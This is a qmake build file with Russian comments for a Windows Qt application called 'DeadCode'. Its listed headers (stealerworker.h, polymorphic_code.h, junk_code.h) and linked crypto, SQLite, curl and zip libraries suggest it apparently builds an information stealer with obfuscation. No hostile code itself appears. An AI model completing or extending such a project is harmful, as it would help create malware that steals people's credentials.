# Основные модули Qt
QT += core gui network widgets sql

# Имя цели и шаблон приложения
TARGET = DeadCode
TEMPLATE = app
CONFIG += c++17

# Исходные файлы
SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h

# Формы Qt Designer
FORMS += \
    mainwindow.ui

# Ресурсы (иконка приложения)
RC_FILE = ../icon.rc

# Пути для включения заголовков
INCLUDEPATH += \
    ../src \
    ../ui \
    C:/Qt/6.5.3/Tools/mingw1120_64/include \
    C:/Qt/6.5.3/Tools/mingw1120_64/include/gdiplus \
    C:/vcpkg/installed/x64-mingw-dynamic/include

# Библиотеки для линковки
LIBS += \
    -L"C:/Qt/6.5.3/Tools/mingw1120_64/lib" \
    -L"C:/vcpkg/installed/x64-mingw-dynamic/lib" \
    -lgdiplus \
    -lws2_32 \
    -lgdi32 \
    -luser32 \
    -ladvapi32 \
    -lshell32 \
    -lole32 \
    -lcrypt32 \
    -lbcrypt \
    -liphlpapi \
    -lsqlite3 \
    -lcurl \
    -lssl \
    -lcrypto \
    -lzip \
    -lbz2 \
    -lz

# Флаги компиляции
QMAKE_CXXFLAGS += \
    -Wall \
    -Wextra \
    -Wpedantic \
    -DUNICODE \
    -D_WIN32 \
    -DWIN32_LEAN_AND_MEAN \
    -DMINGW_HAS_SECURE_API=1 \
    -DGDIPVER=0x0110

# Флаги линковки
QMAKE_LFLAGS += \
    -Wl,-subsystem,windows \
    -mthreads

# Директории для сборки
CONFIG(release, debug|release) {
    DESTDIR = release
    OBJECTS_DIR = release
    MOC_DIR = release
    UI_DIR = release
}

# Очистка при сборке
QMAKE_CLEAN += \
    release/DeadCode.exe \
    release/DeadCode-Portable.zip

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        DESTDIR = debug
        OBJECTS_DIR = debug
        MOC_DIR = debug
        UI_DIR = debug
        QMAKE_CLEAN += \
            debug/DeadCode.exe
    }
}